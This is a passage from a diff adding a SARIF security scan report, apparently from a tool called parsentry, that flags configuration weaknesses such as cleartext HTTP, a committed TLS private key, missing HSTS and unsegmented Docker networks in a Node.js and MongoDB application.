+            "parsentry/v1": "bda3a99dfe0e6410b18ae2f6171fb5dd0354d8ee7a7f07d6a344cbc2e1c7e2ff"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-007",
+          "ruleIndex": 89,
+          "level": "warning",
+          "message": {
+            "text": "No custom Docker networks defined. Web and MongoDB share the default bridge network with no segmentation. A compromised web container has unrestricted access to the database."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5204a47ff17a42146281f82eaf880f266bf25d7da9ab09d83bca5c728bc176e5"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-008",
+          "ruleIndex": 90,
+          "level": "warning",
+          "message": {
+            "text": "Containers do not use read_only: true for the root filesystem. An attacker with code execution can write backdoors, web shells, or persistence mechanisms anywhere in the container filesystem."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7d353ddfe2208a5252050a74802384b9cce6da6be7d6262b9de3b23c9cf458c1"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "CLEARTEXT-TRANSPORT",
+          "ruleIndex": 91,
+          "level": "error",
+          "message": {
+            "text": "Application uses http.createServer() on line 288 instead of https.createServer(). All traffic including authentication credentials, session tokens, and user data is transmitted in cleartext, enabling eavesdropping and man-in-the-middle attacks. The HTTPS fix code (lines 293-297) is commented out."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 288,
+                  "startColumn": 5,
+                  "endLine": 290
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "233431290d259a84e10d2918682d5b2122b265e3c0fbae2b18e320965fa968e8"
+          },
+          "properties": {
+            "confidence": 1.0
+          }
+        },
+        {
+          "ruleId": "PRIVATE-KEY-COMMITTED",
+          "ruleIndex": 92,
+          "level": "error",
+          "message": {
+            "text": "TLS private key file (server.key) is committed to the source repository at artifacts/cert/server.key. Any user with repository access can extract this key and impersonate the server or decrypt captured TLS traffic. Private keys must never be stored in version control."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "artifacts/cert/server.key"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "4d84ce7d57b68d1b8f9215f9c104963d2a3748e73f667ef4113d563f9eaeab03"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SELF-SIGNED-CERT",
+          "ruleIndex": 93,
+          "level": "warning",
+          "message": {
+            "text": "Self-signed TLS certificate (server.crt) stored in artifacts/cert/. Self-signed certificates cannot be validated against a trusted CA chain, making it impossible for clients to verify server identity. This facilitates man-in-the-middle attacks even if HTTPS is enabled."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "artifacts/cert/server.crt"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0f156cbd22f53d6278b48f022d858ff3f5657aa0a9eaa6b6687f2b0f06b284b0"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "NO-HSTS",
+          "ruleIndex": 94,
+          "level": "warning",
+          "message": {
+            "text": "HTTP Strict Transport Security (HSTS) via helmet.hsts() is commented out on line 197. Without HSTS, browsers will not enforce secure connections, allowing protocol downgrade attacks such as SSLStrip."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 197,
+                  "startColumn": 5,
+                  "endLine": 197
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0238b8fb4278c7e5ee9739e3b674ad6db33ae3c10b4d76a1c01b1a7dceac5678"
+          },
+          "properties": {
+            "confidence": 1.0
+          }
+        },
+        {
+          "ruleId": "NO-CIPHER-CONFIG",
+          "ruleIndex": 95,
+          "level": "warning",
+          "message": {
+            "text": "The commented-out httpsOptions (lines 167-170) specifies only key and cert without configuring ciphers, secureProtocol, or minVersion. If HTTPS were enabled as-is, the server would negotiate with default Node.js settings which may include weak cipher suites (RC4, DES) and deprecated protocol versions (TLS 1.0, TLS 1.1)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 167,
+                  "startColumn": 1,
+                  "endLine": 170
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6dea1eae2871b9449179de5779ba35289369ff2d45990b70f77e380bcf4e3ede"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        }
+      ]
+    }
+  ]
+}
